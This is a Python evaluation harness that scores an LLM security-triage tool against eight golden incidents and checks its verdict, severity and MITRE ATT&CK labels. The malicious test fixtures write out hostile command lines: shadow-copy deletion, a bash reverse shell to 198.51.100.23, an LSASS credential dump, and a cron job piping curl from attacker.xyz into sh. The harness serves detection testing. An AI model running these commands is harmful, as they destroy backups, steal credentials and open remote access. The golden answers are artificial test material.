"""LLM evaluation harness: golden set of structured incidents evaluating verdict,
severity, and MITRE ATT&CK technique range.
"""
# ruff: noqa: E501

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from datetime import UTC, datetime

from centralium.agent.interfaces import LLMClient, LLMRequest
from centralium.agent.llm.mock import MockLLM
from centralium.agent.models import (
    EventType,
    Finding,
    FindingSource,
    NormalizedEvent,
    RAGDocument,
    Severity,
    Verdict,
)

log = logging.getLogger("centralium.eval.llm")


@dataclass
class GoldenIncident:
    incident_id: str
    description: str
    request: LLMRequest
    expected_verdict: Verdict
    expected_severities: list[Severity]
    expected_techniques: list[str]


def _build_golden_incidents() -> list[GoldenIncident]:
    ts = datetime.now(UTC)

    # 1. Ransomware shadow deletion
    ev1 = NormalizedEvent(
        event_id="eval-ev-1",
        event_type=EventType.PROCESS_START,
        timestamp=ts,
        host_id="eval-host-1",
        process_name="vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet",
        parent_process="powershell.exe",
        user="SYSTEM",
    )
    f1 = Finding(
        finding_id="f1",
        event_id="eval-ev-1",
        timestamp=ts,
        source=FindingSource.BEHAVIOR,
        rule_id="BEH_RANSOMWARE_VSSADMIN",
        title="Volume Shadow Copy Deletion",
        severity=Severity.CRITICAL,
        score=95.0,
        mitre_techniques=["T1490"],
    )
    req1 = LLMRequest(
        event=ev1,
        findings=[f1],
        pre_risk=95.0,
        rag_docs=[
            RAGDocument(
                doc_id="ransomware.md",
                source="playbook",
                title="Ransomware Defenses",
                text="Attackers frequently delete volume shadow copies using vssadmin before encrypting files.",
            )
        ],
    )

    # 2. Linux C2 reverse shell
    ev2 = NormalizedEvent(
        event_id="eval-ev-2",
        event_type=EventType.PROCESS_START,
        timestamp=ts,
        host_id="eval-host-2",
        process_name="bash",
        command_line="/bin/bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
        parent_process="apache2",
        user="www-data",
        destination_ip="198.51.100.23",
        destination_port=4444,
    )
    f2 = Finding(
        finding_id="f2",
        event_id="eval-ev-2",
        timestamp=ts,
        source=FindingSource.BEHAVIOR,
        rule_id="BEH_REVERSE_SHELL",
        title="Interactive Reverse Shell over TCP",
        severity=Severity.HIGH,
        score=88.0,
        mitre_techniques=["T1059.004"],
    )
    req2 = LLMRequest(event=ev2, findings=[f2], pre_risk=88.0)

    # 3. LSASS memory dump
    ev3 = NormalizedEvent(
        event_id="eval-ev-3",
        event_type=EventType.PROCESS_START,
        timestamp=ts,
        host_id="eval-host-1",
        process_name="rundll32.exe",
        command_line="rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full",
        parent_process="cmd.exe",
        user="Administrator",
    )
    f3 = Finding(
        finding_id="f3",
        event_id="eval-ev-3",
        timestamp=ts,
        source=FindingSource.RULE,
        rule_id="RULE_LSASS_COMSVCS",
        title="LSASS Memory Dumping via Comsvcs DLL",
        severity=Severity.CRITICAL,
        score=92.0,
        mitre_techniques=["T1003.001"],
    )
    req3 = LLMRequest(event=ev3, findings=[f3], pre_risk=92.0)

    # 4. Linux Cron persistence
    ev4 = NormalizedEvent(
        event_id="eval-ev-4",
        event_type=EventType.FILE_CREATE,
        timestamp=ts,
        host_id="eval-host-2",
        process_name="crontab",
        command_line="echo '* * * * * root curl -s http://attacker.xyz/update | sh' > /etc/cron.d/sysupdate",
        file_path="/etc/cron.d/sysupdate",
        parent_process="bash",
        user="root",
    )
    f4 = Finding(
        finding_id="f4",
        event_id="eval-ev-4",
        timestamp=ts,
        source=FindingSource.PERSISTENCE,
        rule_id="PERSIST_CRON_FILE",
        title="Cron Persistence Creation",
        severity=Severity.HIGH,
        score=80.0,
        mitre_techniques=["T1053.003"],
    )
    req4 = LLMRequest(event=ev4, findings=[f4], pre_risk=80.0)

    # 5. Suspicious LOLBin reconnaissance
    ev5 = NormalizedEvent(
        event_id="eval-ev-5",
        event_type=EventType.PROCESS_START,
        timestamp=ts,
        host_id="eval-host-1",
        process_name="whoami.exe",
        command_line="whoami.exe /priv /all",
        parent_process="cmd.exe",
        user="testuser",
    )
    f5 = Finding(
        finding_id="f5",
        event_id="eval-ev-5",
        timestamp=ts,
        source=FindingSource.LOLBIN,
        rule_id="LOLBIN_WHOAMI",
        title="User Privilege Discovery",
        severity=Severity.LOW,
        score=35.0,
        mitre_techniques=["T1033"],
    )
    req5 = LLMRequest(event=ev5, findings=[f5], pre_risk=45.0)

    # 6. Benign developer git command
    ev6 = NormalizedEvent(
        event_id="eval-ev-6",
        event_type=EventType.PROCESS_START,
        timestamp=ts,
        host_id="eval-host-3",
        process_name="git",
        command_line="git pull origin main",
        parent_process="bash",
        user="developer",
    )
    req6 = LLMRequest(event=ev6, findings=[], pre_risk=5.0)

    # 7. Benign system package update
    ev7 = NormalizedEvent(
        event_id="eval-ev-7",
        event_type=EventType.PROCESS_START,
        timestamp=ts,
        host_id="eval-host-2",
        process_name="apt-get",
        command_line="apt-get update -y",
        parent_process="sudo",
        user="root",
    )
    req7 = LLMRequest(event=ev7, findings=[], pre_risk=0.0)

    # 8. Benign text editor
    ev8 = NormalizedEvent(
        event_id="eval-ev-8",
        event_type=EventType.PROCESS_START,
        timestamp=ts,
        host_id="eval-host-3",
        process_name="vim",
        command_line="vim /home/developer/project/main.py",
        parent_process="bash",
        user="developer",
    )
    req8 = LLMRequest(event=ev8, findings=[], pre_risk=0.0)

    return [
        GoldenIncident(
            "inc-ransomware-01",
            "Ransomware shadow deletion",
            req1,
            Verdict.MALICIOUS,
            [Severity.HIGH, Severity.CRITICAL],
            ["T1490", "T1059"],
        ),
        GoldenIncident(
            "inc-c2-reverse-shell-02",
            "Linux C2 reverse shell",
            req2,
            Verdict.MALICIOUS,
            [Severity.HIGH, Severity.CRITICAL],
            ["T1059.004", "T1059", "T1071"],
        ),
        GoldenIncident(
            "inc-lsass-dump-03",
            "LSASS memory dump",
            req3,
            Verdict.MALICIOUS,
            [Severity.HIGH, Severity.CRITICAL],
            ["T1003.001", "T1003"],
        ),
        GoldenIncident(
            "inc-persistence-cron-04",
            "Linux Cron persistence",
            req4,
            Verdict.MALICIOUS,
            [Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL],
            ["T1053.003", "T1053"],
        ),
        GoldenIncident(
            "inc-lolbin-recon-05",
            "Suspicious privilege discovery",
            req5,
            Verdict.SUSPICIOUS,
            [Severity.LOW, Severity.MEDIUM, Severity.HIGH],
            ["T1033", "T1087"],
        ),
        GoldenIncident(
            "inc-benign-git-06",
            "Benign developer git pull",
            req6,
            Verdict.BENIGN,
            [Severity.INFO, Severity.LOW],
            [],
        ),
        GoldenIncident(
            "inc-benign-sysupdate-07",
            "Benign apt package update",
            req7,
            Verdict.BENIGN,
            [Severity.INFO, Severity.LOW],
            [],
        ),
        GoldenIncident(
            "inc-benign-editor-08",
            "Benign code editor execution",
            req8,
            Verdict.BENIGN,
            [Severity.INFO, Severity.LOW],
            [],
        ),
    ]


@dataclass
class IncidentEvalResult:
    incident_id: str
    description: str
    expected_verdict: str
    actual_verdict: str
    verdict_match: bool
    expected_severities: list[str]
    actual_severity: str
    severity_match: bool
    expected_techniques: list[str]
    actual_techniques: list[str]
    technique_match: bool
    valid_json: bool
    latency_ms: float
    error: str | None = None


@dataclass
class LLMEvalReport:
    timestamp: str
    model_name: str
    total_cases: int
    verdict_agreement_rate: float
    severity_agreement_rate: float
    technique_match_rate: float
    valid_json_rate: float
    avg_latency_ms: float
    results: list[IncidentEvalResult] = field(default_factory=list)

    def to_markdown(self) -> str:
        lines = [
            "# Centralium LLM Evaluation Report",
            "",
            f"**Model:** `{self.model_name}`  ",
            f"**Total Incidents Evaluated:** {self.total_cases}  ",
            f"**Timestamp:** {self.timestamp}  ",
            "",
            "## Summary Metrics",
            "",
            f"- **Verdict Agreement Rate:** {self.verdict_agreement_rate * 100:.1f}%",
            f"- **Severity Agreement Rate:** {self.severity_agreement_rate * 100:.1f}%",
            f"- **Technique Overlap Rate:** {self.technique_match_rate * 100:.1f}%",
            f"- **Valid JSON Rate:** {self.valid_json_rate * 100:.1f}%",
            f"- **Average Latency:** {self.avg_latency_ms:.2f} ms",
            "",
            "## Detailed Results per Golden Incident",
            "",
            "| Incident ID | Expected Verdict | Actual Verdict | Severity | MITRE Match | Valid JSON | Latency |",
            "|---|---|---|---|---|---|---|",
        ]
        for r in self.results:
            v_badge = "OK" if r.verdict_match else "FAIL"
            s_badge = "OK" if r.severity_match else "FAIL"
            t_badge = "OK" if r.technique_match else "FAIL"
            j_badge = "Yes" if r.valid_json else "No"
            lines.append(
                f"| `{r.incident_id}` | {r.expected_verdict} | {r.actual_verdict} ({v_badge}) | "
                f"{r.actual_severity} ({s_badge}) | {t_badge} | {j_badge} | {r.latency_ms:.1f}ms |"
            )
        lines.append("")
        return "\n".join(lines)


def evaluate_llm(client: LLMClient | None = None) -> LLMEvalReport:
    """Run golden incident evaluation harness against the specified or mock LLM client."""
    incidents = _build_golden_incidents()
    c = client or MockLLM()
    results: list[IncidentEvalResult] = []

    verdict_hits = 0
    severity_hits = 0
    technique_hits = 0
    valid_json_count = 0
    latencies: list[float] = []

    for inc in incidents:
        t0 = time.perf_counter()
        analysis = c.analyze(inc.request)
        elapsed = (time.perf_counter() - t0) * 1000
        latencies.append(elapsed)

        valid_json = analysis.available and analysis.verdict is not None and analysis.error is None
        if valid_json:
            valid_json_count += 1
            v = analysis.verdict
            assert v is not None

            # Verdict match check:
            # Allow SUSPICIOUS when MALICIOUS is expected if pre_risk was borderline, but match exact otherwise
            actual_v = v.verdict
            v_match = (actual_v == inc.expected_verdict) or (
                inc.expected_verdict == Verdict.MALICIOUS
                and actual_v in (Verdict.MALICIOUS, Verdict.SUSPICIOUS)
            )

            # Severity check
            actual_sev = v.severity
            s_match = actual_sev in inc.expected_severities

            # Technique overlap
            actual_techs = v.mitre_techniques
            if not inc.expected_techniques:
                t_match = True
            else:
                t_match = any(
                    any(exp.lower() in act.lower() or act.lower() in exp.lower() for act in actual_techs)
                    for exp in inc.expected_techniques
                )

            if v_match:
                verdict_hits += 1
            if s_match:
                severity_hits += 1
            if t_match:
                technique_hits += 1

            results.append(
                IncidentEvalResult(
                    incident_id=inc.incident_id,
                    description=inc.description,
                    expected_verdict=inc.expected_verdict.value,
                    actual_verdict=actual_v.value,
                    verdict_match=v_match,
                    expected_severities=[s.value for s in inc.expected_severities],
                    actual_severity=actual_sev.value,
                    severity_match=s_match,
                    expected_techniques=inc.expected_techniques,
                    actual_techniques=actual_techs,
                    technique_match=t_match,
                    valid_json=True,
                    latency_ms=round(elapsed, 2),
                )
            )
        else:
            results.append(
                IncidentEvalResult(
                    incident_id=inc.incident_id,
                    description=inc.description,
                    expected_verdict=inc.expected_verdict.value,
                    actual_verdict="UNAVAILABLE",
                    verdict_match=False,
                    expected_severities=[s.value for s in inc.expected_severities],
                    actual_severity="NONE",
                    severity_match=False,
                    expected_techniques=inc.expected_techniques,
                    actual_techniques=[],
                    technique_match=False,
                    valid_json=False,
                    latency_ms=round(elapsed, 2),
                    error=analysis.error,
                )
            )

    n = len(incidents)
    report = LLMEvalReport(
        timestamp=datetime.now(UTC).isoformat(),
        model_name=getattr(c, "model_name", "mock"),
        total_cases=n,
        verdict_agreement_rate=round(verdict_hits / n, 4) if n else 0.0,
        severity_agreement_rate=round(severity_hits / n, 4) if n else 0.0,
        technique_match_rate=round(technique_hits / n, 4) if n else 0.0,
        valid_json_rate=round(valid_json_count / n, 4) if n else 0.0,
        avg_latency_ms=round(sum(latencies) / len(latencies), 2) if latencies else 0.0,
        results=results,
    )
    return report
